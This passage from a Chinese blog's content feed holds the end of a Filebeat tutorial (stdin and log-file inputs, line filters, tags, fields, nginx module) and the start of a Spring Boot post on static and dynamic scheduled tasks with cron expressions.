class="string">andrew</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2024-7</span><span class="number">-26</span></span><br><span class="line">  <span class="attr">fields_in_root:</span> <span class="literal">false</span>        <span class="comment"># default false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">output.console:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment"># default true</span></span><br><span class="line">  <span class="attr">pretty:</span> <span class="literal">true</span>  <span class="comment"># default false</span></span><br></pre></td></tr></table></figure><p>上述配置文件表示：</p><p>从标准输入读取输入<br>读取包括开头为”andrew”，且不包括”www”的行<br>为输出的数据添加<strong>tags</strong>为”stdin”<br>为输出的数据添加<strong>fields</strong>字段 author为”andrew” date为”2024-7-26”<br>fields添加的字段不位于根路径下，</p><p>输出到控制台，开启pretty美化输出</p><p>输出以下命令启动filebeat</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./filebeat -e -c test.yml</span><br></pre></td></tr></table></figure><p>-e 参数指定输出到stderr而不是配置文件指定的输出（仍然需要配置，否则无法启动）<br>-c 指定启动的配置文件，未指定时默认为filebeat.yml</p><p>在标准输入中输入，”andrew”、”andreww”、”andrewww”，观察输出情况</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">andrew</span><br><span class="line">andreww</span><br><span class="line">andrewww</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-07-26T03:15:21.470Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;beat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filebeat&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.14.3&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;log&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;andrew&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;stdin&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stdin&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;andrew&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-7-26&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ecs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.0.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Andrew&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;agent&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;57b956ef-540a-45a4-bc04-dc192b75c801&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Andrew&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filebeat&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.14.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ephemeral_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b4c352d9-1ed1-4369-95ec-47455c21e272&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-07-26T03:15:22.628Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;beat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filebeat&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.14.3&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;log&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;andreww&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;stdin&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stdin&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;andrew&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-7-26&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ecs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.0.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Andrew&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;agent&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ephemeral_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b4c352d9-1ed1-4369-95ec-47455c21e272&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;57b956ef-540a-45a4-bc04-dc192b75c801&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Andrew&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filebeat&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.14.3&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>观察到filebeat只输出了两个json，message分别为”andrew”、”andreww”，说明include_lines和exclude_lines生效，看到tags存在”stdin”，以及fields下有两个字段”author: “andrew”, “date”: “2024-7-26”</p><p>从<strong>日志文件</strong>输入的配置如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">filebeat.inputs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">log</span></span><br><span class="line">    <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/root/filebeat/logs/*.log</span></span><br><span class="line">    <span class="attr">include_lines:</span> [<span class="string">&#x27;^andrew&#x27;</span>]</span><br><span class="line">    <span class="attr">exclude_lines:</span> [<span class="string">&#x27;ww&#x27;</span>]</span><br><span class="line">    <span class="attr">encoding:</span> <span class="string">utf-8</span></span><br><span class="line">    <span class="attr">tags:</span> [<span class="string">&#x27;log&#x27;</span>]</span><br><span class="line">    <span class="attr">fields:</span></span><br><span class="line">      <span class="attr">author:</span> <span class="string">andrew</span></span><br><span class="line">    <span class="attr">fields_under_root:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">output.console:</span></span><br><span class="line">  <span class="attr">pretty:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>测试结果<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:~/filebeat/logs# echo andrew &gt;&gt; a.log</span><br><span class="line">root@Andrew:~/filebeat/logs# echo andreww &gt;&gt; a.log</span><br><span class="line">root@Andrew:~/filebeat/logs# echo andrewww &gt;&gt; a.log</span><br></pre></td></tr></table></figure><br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-07-27T08:02:55.742Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;beat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filebeat&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_doc&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.14.3&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Andrew&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;agent&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;57b956ef-540a-45a4-bc04-dc192b75c801&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Andrew&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filebeat&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.14.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ephemeral_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;428921c4-3a41-4225-80b5-3d2a3c6aa4bb&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;log&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span> <span class="number">31</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/root/filebeat/logs/a.log&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;andrew&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;log&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;andrew&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ecs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.0.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p><p>指定输出的配置（如Kafka、Elasticsearch等）参考官方文档</p><h1 id="三、使用modules"><a href="#三、使用modules" class="headerlink" title="三、使用modules"></a>三、使用modules</h1><p>通过 filebeat modules 命令操作模块化的配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filebeat modules list          # 查看所有modules</span><br><span class="line">filebeat modules enable nginx  # 启动nginx模块</span><br><span class="line">filebeat modules disable nginx # 关闭nginx模块</span><br></pre></td></tr></table></figure><p>编辑 modules.d 目录下的文件更改配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">module:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="comment"># Access logs</span></span><br><span class="line">  <span class="attr">access:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set custom paths for the log files. If left empty,</span></span><br><span class="line">    <span class="comment"># Filebeat will choose the paths depending on your OS.</span></span><br><span class="line">    <span class="comment">#var.paths:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Error logs</span></span><br><span class="line">  <span class="attr">error:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set custom paths for the log files. If left empty,</span></span><br><span class="line">    <span class="comment"># Filebeat will choose the paths depending on your OS.</span></span><br><span class="line">    <span class="comment">#var.paths:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Ingress-nginx controller logs. This is disabled by default. It could be used in Kubernetes environments to parse ingress-nginx logs</span></span><br><span class="line">  <span class="attr">ingress_controller:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set custom paths for the log files. If left empty,</span></span><br><span class="line">    <span class="comment"># Filebeat will choose the paths depending on your OS.</span></span><br><span class="line">    <span class="comment">#var.paths:</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中实现定时任务，有多少种解决方案？</title>
      <link href="/2024/07/24/Java%E4%B8%AD%E5%AE%9E%E7%8E%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%EF%BC%8C%E6%9C%89%E5%A4%9A%E5%B0%91%E7%A7%8D%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9F/"/>
      <url>/2024/07/24/Java%E4%B8%AD%E5%AE%9E%E7%8E%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%EF%BC%8C%E6%9C%89%E5%A4%9A%E5%B0%91%E7%A7%8D%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久没更新博客了，最近上班做了点小东西，总结复盘一下</p><p>参考资料：</p><p><a href="https://mp.weixin.qq.com/s/OvBX546k1yhQwiLih-oCmQ">SpringBoot 设置动态定时任务，千万别再写死了~ (qq.com)</a></p><p><a href="https://developer.aliyun.com/article/775305">3千字带你搞懂XXL-JOB任务调度平台-阿里云开发者社区 (aliyun.com)</a></p><h1 id="一、定时任务"><a href="#一、定时任务" class="headerlink" title="一、定时任务"></a>一、定时任务</h1><h2 id="1-引入依赖"><a href="#1-引入依赖" class="headerlink" title="1. 引入依赖"></a>1. 引入依赖</h2><p>创建Springboot应用，引入相应依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在spring-boot-starter-web中排除spring-boot-starter-logging是为了不使用springboot默认的日志实现logback，而是引入log4j2的日志实现</p><p>引入lombok是为了使用@Data、@RequiredArgsConstructor等注解</p><h2 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2. 代码实现"></a>2. 代码实现</h2><p>在启动类上添加注解@EnableScheduling</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.EnableScheduling;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@SpringBootApplication</span>  </span><br><span class="line"><span class="meta">@EnableScheduling</span>   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DttNoticeApplication</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        SpringApplication.run(DttNoticeApplication.class, args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件指定运行的端口：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>编写实现定时任务的类，用@Scheduled修饰执行定时任务的方法，并用@Component将该类注册为Bean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.Scheduled;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Task</span>&#123;</span><br><span class="line">    <span class="comment">// cron表达式常用于定时任务，此处表示每10秒执行一次</span></span><br><span class="line">    <span class="meta">@Scheduled(cron=&quot;0/10 * * * * ?&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">scheduledTask</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二、动态定时任务"><a href="#二、动态定时任务" class="headerlink" title="二、动态定时任务"></a>二、动态定时任务</h1><p>定时任务执行时间的配置文件，位于resources/task-config.ini：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printTime.cron=0/10 * * * * 